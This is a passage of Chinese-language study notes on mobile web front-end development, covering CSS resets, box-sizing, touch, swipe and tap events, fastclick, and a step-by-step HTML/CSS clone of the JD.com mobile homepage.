    <meta name="viewport" content="width=device-width,initial-scale=1.0,user-scalable=0">
    <title>Title</title>
    <style>
        body{
            margin: 0;
            padding: 0;
        }
        .box{
            width:100%;
            /*设置内边距*/
            padding: 20px;
            /*设置边框*/
            border:5px solid pink;
            -webkit-box-sizing: border-box;
            -moz-box-sizing: border-box;
            box-sizing: border-box;
        }
    </style>
</head>
<body>
<div class="box">
    布局布局布局布局布局布局布局布局布局布局
    布局布局布局布局布局布局布局布局布局布局
    布局布局布局布局布局布局布局布局布局
    布局布局布局布局布局布局布局布局布局布局
    布局布局布局布局布局布局布局布局布局布局布局布局布
    局布局布局布局布局布局布局布局布局布局布局布局布局布局布
    局布局布局布局布局布局布局布局布局布局布局布局布局
</div>
</body>
</html>
```
>[danger] ##### -webkit-tap-highlight-color 轻触高亮设置
* 默认显示高亮效果
![](https://box.kancloud.cn/c8b43fa2258d97c38f19052a198b3e99_327x156.png)
```
1.想该更高亮颜色或者不显示高亮效果通过设置
 -webkit-tap-highlight-color：red； //显示红色
 -webkit-tap-highlight-color: transparent; // 不显示颜色
```
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,user-scalable=0">
    <title>Title</title>
    <style>
        a{
            display: block;
            width: 100px;
            height: 100px;
            /*轻击 轻触*/
            -webkit-tap-highlight-color: red;
        }
    </style>
</head>
<body>
<a href="javascript:;"></a>
</body>
</html>
```
>[success] # 通用样式css 写法 -- base.css
```
/*=======reset css========*/
*,
*::before,
*::after{
    /*所有的标签，和伪元素都选中*/
    margin: 0;
    padding: 0;
    /*移动端常用布局是非固定像素*/
    box-sizing: border-box;
    -webkit-box-sizing: border-box;
    /*点击高亮效果的清除*/
    tap-highlight-color: transparent;
    -webkit-tap-highlight-color: transparent;
}
body{
    font-size: 14px;
    font-family: "Microsoft YaHei",sans-serif;
    color: #333;
}
ul,ol{
    list-style: none;
}
a{
    text-decoration: none;
    color: #333;
}
input,textarea{
    border: none;
    outline: none;
    /*不允许改变textarea尺寸*/
    resize: none;
    /*元素的外观  none没有任何样式*/
    -webkit-appearance: none;
}
/*=======common css========*/
.f_left{
    float: left;
}
.f_right{
    float: right;
}
.clearFix::before,
.clearFix::after{
    content: "";
    display: block;
    visibility: hidden;
    height: 0;
    line-height: 0;
    clear: both;
}
.m_l10{
    margin-left:10px;
}
.m_r10{
    margin-right:10px;
}
.m_t10{
    margin-top:10px;
}
.m_b10{
    margin-bottom:10px;
}
/*使用精灵图的公用样式*/
[class^="icon_"],[class*=" icon_"]{
    background-repeat: no-repeat;
    background-image: url("../images/sprites.png");
    background-size: 200px 200px;
}
```
>[danger] ##### 通用精灵图的引入
```
[class^="icon_"],[class*=" icon_"]{
    background-repeat: no-repeat;
    background-image: url("../images/sprites.png");
    background-size: 200px 200px;
}

1.以icon_开头的，或者 是 class="red icon_" 这种有空格的
```
>[success] # 两栏自适应布局
![](https://box.kancloud.cn/59a86650be3e24aebb9d95e9b3de9253_368x522.png)
```
1.当更改容器的时候 容器右侧内容栏可以自适应变化
2.利用文本环绕，文本会环绕浮动文字内容
3.利用overflow: hidden; 让这个元素绝对绝缘  bfc，成让内容在自己div中去变化
```
>[danger] ##### 案例
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        body,html{
            margin: 0;
            padding: 0;
            height: 100%;
        }
        .box1{
            float: left;
            width: 100px;
            height: 100%;
            background: pink;
        }
        .box2{
            /*让这个元素绝对绝缘  bfc*/
            /*不让其他浮动元素影响自己*/
            /*不让自己的浮动去影响别的元素*/
            overflow: hidden;
        }
    </style>
</head>
<body>
<!--1.小技巧-->
<!--2.文本环绕-->
<div class="box1"></div>
<div class="box2">
    内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容
    内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容
    内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容
    内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容
    内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容
    内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容
    内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容
    内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容
    内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容
    内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容
    内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容
    内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容
    内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容
    内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容
    内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容
    内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容
    内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容
    内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容
    内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容
    内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容
    内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容内容
</div>
</body>
</html>
```
>[success] # 移动端事件touch
```
1.利用touch相关事件实现移动端常见滑动效果和移动端常见的手势事件
2. touchstart ---  当手指触摸屏幕的时候触发
3. touchmove --- 当手指在屏幕来回的滑动时候触发
4. touchend --- 当手指离开屏幕的时候触发
5. touchcancel --- 当被迫终止滑动的时候触发（来电，弹消息）

注：对于touchcancel说明touchcancel事件简单的说是在移动端发生了触摸中
断，一般情况下就是优先级比当前活动更高的事件时，才会触发的。比如正在看
新闻，手指滑动屏幕的时候，突然来电话，直接中断了触摸事件，跳转到了通
话，页面此时就触发了touchcancel事件
```
* 事件对象
```
.事件对象：
名字：TouchList------触摸点（一个手指触摸就是一个触发点，和屏幕的接触点的个数）的集合addEventListener 事件
1.changedTouches    改变后的触摸点集合
2.targetTouches     当前元素的触发点集合
3.touches           页面上所有触发点集合

changedTouches 每个事件都会记录
targetTouches，touches 在离开屏幕的时候无法记录触摸点
```

>[danger] ##### 简单的案例使用
![](https://box.kancloud.cn/cc68a71885a58d6fe92d84cc0a8289c3_864x245.png)
```
1.可以使用ontouchstart 事件使用，但由于移动端要考虑的兼容问题大多是谷歌
 浏览器，所以可以直接使用addEventListener 事件
```
* html 声明手机端meta 的格式
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <title>Title</title>
    <style>
        body{
            margin: 0;
            padding: 0;
        }
        .box{
            width: 200px;
            height: 200px;
            background: pink;
        }
    </style>
</head>
<body>
<div class="box"></div>
</body>
```
* js事件
```
<script>
    window.onload = function () {
        var box = document.querySelector('.box');
        box.addEventListener('touchstart',function (e) {
            console.log('start');
            console.log(e.touches[0].clientX,e.touches[0].clientY);
            console.log(e.touches[0].pageX,e.touches[0].pageY);
            console.log(e.touches[0].screenX,e.touches[0].screenY);
        });
        box.addEventListener('touchmove',function (e) {
            console.log('move');
            console.log(e);
        });
        box.addEventListener('touchend',function (e) {
            console.log('end');
            console.log(e);
        });
        /*box.addEventListener('click',function (e) {
            console.log('click');
            console.log(e);
        });*/
    }
</script>
```
>[danger] ##### 滑动分析
* 案例见京东商城
```
1 就是让触摸的元素随着手指的滑动做位置的改变
2 位置的改变：需要当前手指的坐标
3 在每一个触摸点中会记录当前触摸点的坐标 e.touches[0] 第一个触摸点
4 clientX clientY      基于浏览器窗口（视口）
5 pageX   pageY        基于页面（视口）
6 screenX screenY      基于屏幕
``` 
>[success] # 手势左右滑动操作
```
1.通过三种状态获取坐标
2.根据坐标进行位置判断，左面滑动还是右面滑动
```
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <title>Title</title>
    <style>
        body {
            margin: 0;
            padding: 0;
        }

        .box {
            width: 200px;
            height: 200px;
            background: pink;
            float: left;
        }
    </style>
</head>
<body>
<div class="box"></div>
<script>
    window.onload = function () {
        /*1. 理解移动端的手势事件*/
        /*2. swipe swipeLeft  swipeRight swipeUp swipeDown */
        /*3. 左滑和右滑手势怎么实现*/
        var bindSwipeEvent = function (dom,leftCallback,rightCallback) {
            /*手势的条件*/
            /*1.必须滑动过*/
            /*2.滑动的距离50px*/
            var isMove = false;
            var startX = 0;
            var distanceX = 0;
            dom.addEventListener('touchstart',function (e) {
                startX = e.touches[0].clientX;
            });
            dom.addEventListener('touchmove',function (e) {
                isMove = true;
                var moveX = e.touches[0].clientX;
                distanceX = moveX - startX;
            });
            dom.addEventListener('touchend',function (e) {
                /*滑动结束*/
                if(isMove && Math.abs(distanceX) > 50){
                    if(distanceX > 0){
                        // 必须有这个参数，判断有没有回调函数然后更改这个参数的指向this
                        rightCallback && rightCallback.call(this,e);
                    }else{
                        leftCallback && leftCallback.call(this,e);
                    }
                }

                /*重置参数*/
                isMove = false;
                startX = 0;
                distanceX = 0;
            });
        }
        bindSwipeEvent(document.querySelector('.box'),function (e) {
            console.log(this);
            console.log(e);
            console.log('左滑手势');
        },function (e) {
            console.log(this);
            console.log(e);
            console.log('右滑手势');
        });

    }
</script>
</body>
</html>
```
>[success] # 移动端点击事件封装
```
1. 自定义tap事件  轻击 轻触  （响应速度快）
2. 移动端也有click事件 （在移动为了区分是滑动还是点击，click点击延时300ms）
3. 影响用户体验 响应太慢了。
4. 解决方案：
4.1 使用tap事件（不是移动端原生事件，通过touch相关事件衍生过来） （zepto.js tap事件）了解其原理
4.2 使用一个叫：fastclick.js 提供移动端click响应速度的
4.2.1 下载：https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js
```
>[danger] ##### 自定义一个点击事件
```
1.在touchstart事件记录 触碰开始时间
2.在touchmove 设置记录是否滑动标记的布尔值
3.在touchend 记录离开时间和开始时间是否在150ms以内
```
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <style>
        body {
            margin: 0;
            padding: 0;
        }

        .box {
            width: 200px;
            height: 200px;
            background: pink;
            float: left;
        }
    </style>
</head>
<body>
<div class="box"></div>
<script>
  window.onload = function () {
        /*使用tap事件*/
        /*1. 响应的速度比click要快   150ms */
        /*2. 不能滑动*/
        var bindTapEvent = function (dom, callback) {
            /*事件的执行顺序*/
            /*在谷歌浏览器模拟看不到300ms的效果*/
            /*在真机上面才能看看到延时效果*/
            var startTime = 0;
            var isMove = false;
            dom.addEventListener('touchstart', function () {
                //console.log('touchstart');
                startTime = Date.now();
                /*Date.now();*/
            });
            dom.addEventListener('touchmove', function () {
                //console.log('touchmove');
                isMove = true;
            });
            dom.addEventListener('touchend', function (e) {
                //console.log('touchend');
                console.log((Date.now() - startTime));
                if ((Date.now() - startTime) < 150 && !isMove) {
                    callback && callback.call(this, e);
                }

                startTime = 0;
                isMove = false;
            });
            /*dom.addEventListener('click',function () {
             //console.log('click');
             });*/
        }

        bindTapEvent(document.querySelector('.box'), function (e) {
            console.log(this);
            console.log(e);
            console.log('tap事件')
        });
    }
</script>
</body>
</html>
```
>[danger] ##### 使用插件fastclick.js
```
 /*当页面的dom元素加载完成*/
    document.addEventListener('DOMContentLoaded', function() {
        /*初始化方法*/
        FastClick.attach(document.body);
    }, false);
    /*正常使用click事件就可以了*/
```
[TOC]
>[success] # 京东案例
```
1.搜索框使用了 双飞翼布局效果，设置百分百宽度后对应设置最大宽度和最小宽度
```
>[danger] ##### 通用 base.css
```
1. 具体详解见通用样式解释
```
```
/*=======reset css========*/
*,
*::before,
*::after{
    /*所有的标签，和伪元素都选中*/
    margin: 0;
    padding: 0;
    /*移动端常用布局是非固定像素*/
    box-sizing: border-box;
    -webkit-box-sizing: border-box;
    /*点击高亮效果的清除*/
    tap-highlight-color: transparent;
    -webkit-tap-highlight-color: transparent;
}
body{
    font-size: 14px;
    font-family: "Microsoft YaHei",sans-serif;
    color: #333;
}
ul,ol{
    list-style: none;
}
a{
    text-decoration: none;
    color: #333;
}
input,textarea{
    border: none;
    outline: none;
    /*不允许改变textarea尺寸*/
    resize: none;
    /*元素的外观  none没有任何样式*/
    -webkit-appearance: none;
}
/*=======common css========*/
.f_left{
    float: left;
}
.f_right{
    float: right;
}
.clearFix::before,
.clearFix::after{
    content: "";
    display: block;
    visibility: hidden;
    height: 0;
    line-height: 0;
    clear: both;
}
.m_l10{
    margin-left:10px;
}
.m_r10{
    margin-right:10px;
}
.m_t10{
    margin-top:10px;
}
.m_b10{
    margin-bottom:10px;
}
/*使用精灵图的公用样式*/
[class^="icon_"],[class*=" icon_"]{
    background-repeat: no-repeat;
    background-image: url("../images/sprites.png");
    background-size: 200px 200px;
}
```
>[danger] ##### 搜索头部 布局
![](https://box.kancloud.cn/e0994a8bb3c07ddadc4332716cee010b_681x50.png)
![](https://box.kancloud.cn/cac168a705e55c80029a222c843fa22a_554x153.png)
```
1.红色是header 标签因为是固定fixed 属性设置，所以内部又定一个绿色div
2.定义绿色的div 主要是为了能让头部内容居中对齐，设置高度，宽度是流失布局，为了居中，就给设置最大宽度和最小宽度
3.内部用子绝父相定位好左面的logo 和右面的登录
4.设置from 外边距相对于 logo的和登陆的宽度形成双飞翼效果
5.设置input 宽度的百分比
```
* html
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,user-scalable=0">
    <title>京东移动站-首页</title>
    <link rel="stylesheet" href="css/base.css">
    <link rel="stylesheet" href="css/index.css">
</head>
<body>
<div class="jd_container">
    <!-- 让头部固定导致脱离文档流-->
    <header class="jd_search">
        <!--在设置一个包含容器-->
        <div class="jd_search_box">
            <a href="#" class="icon_logo">11</a>
            <form action="#">
                <span class="icon_search"></span>
                <input type="search" placeholder="占位提示">
            </form>
            <a href="#" class="login">登陆</a>
        </div>
    </header>
</div>
</body>
</html>
```
* css
```
/* 设置成灰色背景 */
body{
    background: #f5f5f5;
}

/* 版心*/
.jd_container{
    background: pink;
    margin: 0 auto;
    width: 100%;
    max-width: 640px;
    min-width: 320px;

}

/*搜索固定 头部，相对于浏览器的左上角*/
.jd_search{
    width: 100%;
    height: 40px;
    position:fixed;
    top:0;
    left: 0;
}

/*将包含容器居中，继承了上面的宽度百分百，设置居中就要设置最大最小值*/
.jd_search .jd_search_box{
    height: 40px;
    margin: 0 auto;
    max-width: 640px;
    min-width: 320px;
    background: rgba(201,21,35,0.85);
    position: relative;
}

/*设置logo 位置定位*/
.jd_search .jd_search_box .icon_logo{
    width: 60px;
    height: 30px;
    background: #333333;
    position: absolute;
    top: 4px;
    left: 10px;
}

/*设置登录图标login*/
.jd_search .jd_search_box .login{
    position: absolute;
    right: 0;
    top: 0;
    width: 50px;
    height: 40px;
    line-height: 40px;
    text-align: center;
    color: #fff;
}

/*双飞翼设置，根据上面左右宽度设置 div 外边距*/
.jd_search .jd_search_box form{
    width: 100%;
    padding-left:70px;
    padding-right:50px;
    position: relative;
}

.jd_search .jd_search_box form .icon_search{
    position: absolute;
    width: 20px;
    height: 20px;
    left: 80px;
    top: 10px;
   // 精灵图的设置
    background-position: -60px -109px;

}

/*百分比的计算：基于父容器的内容的宽度*/
.jd_search .jd_search_box form input{
    width: 100%;
    height: 30px;
    margin-top:5px;
    background: #fff;

    border-radius: 15px;
    padding-left: 40px;
}
```
>[danger] ##### 设置轮播图
![](https://box.kancloud.cn/6fbd3b6ccff6c534fba0651ce21e418a_664x318.png)
* html
```
    <div class="jd_banner">
        <ul>
            <li><a href="#"><img src="images/l8.jpg" alt=""></a></li>
            <li><a href="#"><img src="images/l1.jpg" alt=""></a></li>
            <li><a href="#"><img src="images/l2.jpg" alt=""></a></li>
            <li><a href="#"><img src="images/l3.jpg" alt=""></a></li>
            <li><a href="#"><img src="images/l4.jpg" alt=""></a></li>
            <li><a href="#"><img src="images/l5.jpg" alt=""></a></li>
            <li><a href="#"><img src="images/l6.jpg" alt=""></a></li>
            <li><a href="#"><img src="images/l7.jpg" alt=""></a></li>
            <li><a href="#"><img src="images/l8.jpg" alt=""></a></li>
            <li><a href="#"><img src="images/l1.jpg" alt=""></a></li>
        </ul>
        <ul>
            <li class="now"></li>
            <li></li>
            <li></li>
            <li></li>
            <li></li>
            <li></li>
            <li></li>
            <li></li>
        </ul>
    </div>

```
* css
```
1.整个ul 放下所有li的图片，所以ul宽度是li*个数
2.移动ul改变transform
```
```
.jd_banner{
    width: 100%;
    overflow: hidden;
    position: relative;

}
/*设置第一个ul,移动ul 展示第一张图片*/
.jd_banner ul:first-child{
    width: 1000%;
    transform: translateX(-10%);
    -webkit-transform:translateX(-10%);
}
/*第一个 ul 下的所有li*/
.jd_banner ul:first-child li{
    width: 10%;
    float: left;
}
.jd_banner ul:first-child li a{
    display: block;
    width: 100%;
}

/*图片设置块级元素 是为了去掉基线对齐*/
.jd_banner ul:first-child li a img{
    display: block;
    width: 100%;
}
/*设置 轮播图 按钮*/
.jd_banner ul:last-child{
    position: absolute;
    width: 118px;
    height: 6px;
    left: 50%;
    margin-left:-59px;
    bottom: 6px;
}

.jd_banner ul:last-child li{
    width: 6px;
    height: 6px;
    border-radius: 3px;
    border: 1px solid #fff;
    margin-left:10px;
    float: left;
}
.jd_banner ul:last-child li:first-child{
    margin-left:0;
}
.jd_banner ul:last-child li.now{
    background: #fff;
}
```
>[danger] ##### 设置导航栏
![](https://box.kancloud.cn/7b44936997083ad0d04da3a38c8885fa_644x155.png)
```
1.将图片设置在 li中居中
```
```
/*导航*/
.jd_nav{
    width: 100%;
    background: #ffffff;
    border-bottom: 1px solid #ccc;
}

.jd_nav ul{
    width: 100%;
    padding-top: 10px;
    padding-bottom: 10px;
}
.jd_nav ul li{
    width: 25%;
    float: left;
}
.jd_nav ul li a{
    display: block;
    width: 100%;
}
/* 设置在li中居中*/
.jd_nav ul li a img{
    display: block;
    width: 40px;
    height: 40px;
    margin: 0 auto;
}
.jd_nav ul li a p{
    text-align: center;
    font-size: 12px;
    color: #666;
    padding: 5px 0;
}
```
```
 <nav class="jd_nav">
        <ul class="clearFix">
            <li><a href="#"><img src="images/nav0.png" alt=""><p>分类</p></a></li>
            <li><a href="#"><img src="images/nav1.png" alt=""><p>分类</p></a></li>
            <li><a href="#"><img src="images/nav2.png" alt=""><p>分类</p></a></li>
            <li><a href="#"><img src="images/nav3.png" alt=""><p>分类</p></a></li>
            <li><a href="#"><img src="images/nav4.png" alt=""><p>分类</p></a></li>
            <li><a href="#"><img src="images/nav5.png" alt=""><p>分类</p></a></li>
            <li><a href="#"><img src="images/nav6.png" alt=""><p>分类</p></a></li>
            <li><a href="#"><img src="images/nav7.png" alt=""><p>分类</p></a></li>
        </ul>
    </nav>
```

>[danger] ##### 内容区域设置
![](https://box.kancloud.cn/78a6fc4ad1df098d2fa2c6455987cf7e_452x553.png)
```
1.红线用伪类设置，通过子绝父相定位
```
```
    <div class="jd_product">
        <section class="jd_product_box">
            <div class="tit nb"></div>
        </section>
        <section class="jd_product_box">
            <div class="tit"><h3>京东超市</h3></div>
        </section>
        <section class="jd_product_box">
            <div class="tit"><h3>京东超市</h3></div>
        </section>
        <section class="jd_product_box">
            <div class="tit"><h3>京东超市</h3></div>
        </section>
    </div>
```
```
/*产品区块*/
.jd_product{
    padding: 0 5px;
}
/*产品盒子*/
.jd_product_box{
    margin-top: 10px;
    box-shadow: 0 0 2px #ccc;
    background: #fff;
    min-height: 200px;
}
.tit{
    height: 34px;
    line-height: 34px;
    border-bottom: 1px solid #ddd;
}
.jd_product_box .tit.nb{
    border-bottom: none;
}
.jd_product_box .tit h3{
    font-weight: normal;
    position: relative;
    padding-left:23px;
}
/* 设置 红线效果*/
.jd_product_box .tit h3::before{
    content: "";
    width: 3px;
    height: 12px;
    background: #d8505c;
    position: absolute;
    left: 10px;
    top: 11px;
}
```
>[danger] ##### 秒杀头部 css
![](https://box.kancloud.cn/8935d98c7c24258c2524b48a42f6e139_420x23.png)
```
1.做了大量的浮动就是 为了让屏幕缩放的时候可以自适应
```
```
        <section class="jd_product_box sk">
            <div class="tit nb">
                <div class="f_left">
                    <span class="icon"></span>
                    <span class="name">掌上描述</span>
                    <div class="time">
                        <span>0</span>
                        <span>0</span>
                        <span>:</span>
                        <span>0</span>
                        <span>0</span>
                        <span>:</span>
                        <span>0</span>
                        <span>0</span>
                    </div>
                </div>
                <div class="f_right"><a class="m_r10" href="#">更多&gt;</a></div>
            </div>
        </section>

```
```
/*秒杀头部*/
.sk .icon{
    width: 16px;
    height: 20px;
    float: left;
    margin-left:10px;
    margin-top:7px;
    background: url("../images/seckill-icon.png") no-repeat center/16px 20px;
}

.sk .name{
    float: left;
    margin-left:10px;
    font-size: 16px;
    color: #d8505c;
}
.sk .time{
    float: left;
    margin-left:10px;
}
.sk .time span{
    float: left;
    width: 16px;
    height: 16px;
    line-height: 16px;
    text-align: center;
    color: #fff;
    background: #333;
    margin-left: 3px;
    margin-top:9px;
}
/*让时间的 ： 没有背景黑色，3的倍数*/
.sk .time span:nth-child(3n){
    background: #fff;
    width: 3px;
    color: #333;
}
```
>[danger] ##### 内容
![](https://box.kancloud.cn/ac29b09d185df37ba466b5001ed99228_640x209.png)
```
1. 注意图片设置一定要设置宽度，让图片居中方法缩小图片然后居中margin：0 auto
```
```
            <div class="con">
                <ul class="pro clearFix">
                    <li>
                        <a href="#"><img src="images/detail01.jpg" alt=""></a>
                        <p class="nowPrice">&yen;10.00</p>
                        <p class="oldPrice">&yen;100.00</p>
                    </li>
                    <li>
                        <a href="#"><img src="images/detail02.jpg" alt=""></a>
                        <p class="nowPrice">&yen;10.00</p>
                        <p class="oldPrice">&yen;100.00</p>
                    </li>
                    <li>
                        <a href="#"><img src="images/detail01.jpg" alt=""></a>
                        <p class="nowPrice">&yen;10.00</p>
                        <p class="oldPrice">&yen;100.00</p>
                    </li>
                </ul>
            </div>

```
```
.sk .pro{
    width: 100%;
    padding: 10px 0;
}

.sk .pro li{
    width: 33.333%;
    float:left;
}
.sk .pro li a{
    display: block;
    border-right: 1px solid #ddd;
}
.sk .pro li:last-child a{
    border-right:none;
}
.sk .pro li a img{
    display: block;
    margin: 0 auto;
    width: 64%;
}
.sk .pro li p{
    text-align: center;
}
.sk .pro li p{
    text-align: center;
    font-size: 12px;
    padding: 5px 0;
}
.sk .pro li .nowPrice{
    color: #d8505c;
}
.sk .pro li .oldPrice{
    color: #666;
    text-decoration: line-through;
}
```
>[danger] ##### 组合样式
![](https://box.kancloud.cn/1c32ff79271fd15b3c6013b127fb97ba_428x250.png)
```
<section class="jd_product_box">
        <div class="tit"><h3>京东自营</h3></div>
        <div class="con clearFix">
            <a class="w_50p f_right bl" href="#"><img src="images/cp4.jpg" alt=""></a>
            <a class="w_50p f_left bb" href="#"><img src="images/cp5.jpg" alt=""></a>
            <a class="w_50p f_left" href="#"><img src="images/cp6.jpg" alt=""></a>
        </div>
</section>
```
```
/*组合样式的使用*/
.w_50p{
    width: 50%;
}
.w_50p img{
    display: block;
    width: 100%;
}
.bl{
    border-left:1px solid #ddd;
}
.br{
    border-right:1px solid #ddd;
}
.bb{
    border-bottom:1px solid #ddd;
}
```
[TOC]
>[success] # 完整的代码
``` html

 <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,user-scalable=0">
    <title>京东移动站-首页</title>
    <link rel="stylesheet" href="css/base.css">
    <link rel="stylesheet" href="css/index.css">
</head>
<body>
<!--版心-->
<!--
1.最大宽度设置成了640px
2.设计稿psd的尺寸就是640px
3.目的：当设备的尺寸比设计稿不至于失真
4.640px的尺寸设计稿的原因：根据当前主要流行的设备尺寸有关系iphone4,4s 尺寸320px
5.750px的设计稿：参考原型iphone6 尺寸375px
6.最小宽度320px  保证最小的宽度320px不让页面错乱
-->
<div class="jd_container">
    <!--顶部搜索-->
    <header class="jd_search">
        <div class="jd_search_box">
            <a href="#" class="red icon_logo"></a>
            <form action="#">
                <span class="icon_search"></span>
                <input type="search" placeholder="占位符">
            </form>
            <a href="#" class="login">登录</a>
        </div>
    </header>
    <!--轮播图-->
    <div class="jd_banner">
        <ul class="clearFix">
            <li><a href="#"><img src="images/l8.jpg" alt=""></a></li>
            <li><a href="#"><img src="images/l1.jpg" alt=""></a></li>
            <li><a href="#"><img src="images/l2.jpg" alt=""></a></li>
            <li><a href="#"><img src="images/l3.jpg" alt=""></a></li>
            <li><a href="#"><img src="images/l4.jpg" alt=""></a></li>
            <li><a href="#"><img src="images/l5.jpg" alt=""></a></li>
            <li><a href="#"><img src="images/l6.jpg" alt=""></a></li>
            <li><a href="#"><img src="images/l7.jpg" alt=""></a></li>
            <li><a href="#"><img src="images/l8.jpg" alt=""></a></li>
            <li><a href="#"><img src="images/l1.jpg" alt=""></a></li>
        </ul>
        <ul>
            <li class="now"></li>
            <li></li>
            <li></li>
            <li></li>
            <li></li>
            <li></li>
            <li></li>
            <li></li>
        </ul>
    </div>
    <!--导航栏-->
    <nav class="jd_nav">
        <ul class="clearFix">
            <li><a href="#"><img src="images/nav0.png" alt=""><p>分类</p></a></li>
            <li><a href="#"><img src="images/nav1.png" alt=""><p>分类</p></a></li>
            <li><a href="#"><img src="images/nav2.png" alt=""><p>分类</p></a></li>
            <li><a href="#"><img src="images/nav3.png" alt=""><p>分类</p></a></li>
            <li><a href="#"><img src="images/nav4.png" alt=""><p>分类</p></a></li>
            <li><a href="#"><img src="images/nav5.png" alt=""><p>分类</p></a></li>
            <li><a href="#"><img src="images/nav6.png" alt=""><p>分类</p></a></li>
            <li><a href="#"><img src="images/nav7.png" alt=""><p>分类</p></a></li>
        </ul>
    </nav>
    <!--产品区块-->
    <div class="jd_product">
        <section class="jd_product_box sk"><!--second kill-->
            <div class="tit nb">
                <div class="f_left">
                    <span class="icon"></span>
                    <span class="name">掌上描述</span>
                    <div class="time">
                        <span>0</span>
                        <span>0</span>
                        <span>:</span>
                        <span>0</span>
                        <span>0</span>
                        <span>:</span>
                        <span>0</span>
                        <span>0</span>
                    </div>
                </div>
                <div class="f_right"><a class="m_r10" href="#">更多&gt;</a></div>
            </div>
            <div class="con">
                <ul class="pro clearFix">
                    <li>
                        <a href="#"><img src="images/detail01.jpg" alt=""></a>
                        <p class="nowPrice">&yen;10.00</p>
                        <p class="oldPrice">&yen;100.00</p>
                    </li>
                    <li>
                        <a href="#"><img src="images/detail02.jpg" alt=""></a>
                        <p class="nowPrice">&yen;10.00</p>
                        <p class="oldPrice">&yen;100.00</p>
                    </li>
                    <li>
                        <a href="#"><img src="images/detail01.jpg" alt=""></a>
                        <p class="nowPrice">&yen;10.00</p>
                        <p class="oldPrice">&yen;100.00</p>
                    </li>
                </ul>
            </div>
        </section>
        <section class="jd_product_box">
            <div class="tit"><h3>京东超市</h3></div>
            <div class="con clearFix">
                <a class="w_50p f_left br" href="#"><img src="images/cp1.jpg" alt=""></a>
                <a class="w_50p f_right bb" href="#"><img src="images/cp2.jpg" alt=""></a>
                <a class="w_50p f_right" href="#"><img src="images/cp3.jpg" alt=""></a>
            </div>
        </section>
        <section class="jd_product_box">
            <div class="tit"><h3>京东自营</h3></div>
            <div class="con clearFix">
                <a class="w_50p f_right bl" href="#"><img src="images/cp4.jpg" alt=""></a>
                <a class="w_50p f_left bb" href="#"><img src="images/cp5.jpg" alt=""></a>
                <a class="w_50p f_left" href="#"><img src="images/cp6.jpg" alt=""></a>
            </div>
        </section>
        <section class="jd_product_box">
            <div class="tit"><h3>京东热门</h3></div>
            <div class="con clearFix">
                <a class="w_50p f_left br" href="#"><img src="images/cp1.jpg" alt=""></a>
                <a class="w_50p f_right bb" href="#"><img src="images/cp2.jpg" alt=""></a>
                <a class="w_50p f_right" href="#"><img src="images/cp3.jpg" alt=""></a>
            </div>
        </section>
    </div>
</div>
<script src="js/common.js"></script>
<script src="js/indexx.js"></script>
</body>
</html>
```
>[danger] ##### index.css
```
body{
    background: #f5f5f5;
}
/*版心*/
.jd_container{
    min-width: 320px;
    max-width: 640px;
    width: 100%;
    margin: 0 auto;
}
/*顶部搜索*/
.jd_search{
    width: 100%;
    height: 40px;
    position: fixed;
    left: 0;
    top: 0;
    z-index: 1000;
}
/*内容居中*/
.jd_search .jd_search_box{
    height: 40px;
    background: rgba(201,21,35,0.85);
    min-width: 320px;
    max-width: 640px;
    width: 100%;
    margin: 0 auto;
    position: relative;
}
.jd_search .jd_search_box .icon_logo{
    position: absolute;
    left: 10px;
    top: 4px;
    width: 60px;
    height: 36px;
    background-position: 0 -103px;
}
.jd_search .jd_search_box .login{
    position: absolute;
    right: 0;
    top: 0;
    width: 50px;
    height: 40px;
    line-height: 40px;
    text-align: center;
    color: #fff;
}
.jd_search .jd_search_box form{
    width: 100%;
    padding-left:70px;
    padding-right:50px;
    position: relative;
}
.jd_search .jd_search_box form .icon_search{
    width: 20px;
    height: 20px;
    position: absolute;
    left: 80px;
    top: 10px;
    background-position: -60px -109px;
}
/*百分比的计算：基于父容器的内容的宽度*/
.jd_search .jd_search_box form input{
    width: 100%;
    height: 30px;
    margin-top:5px;
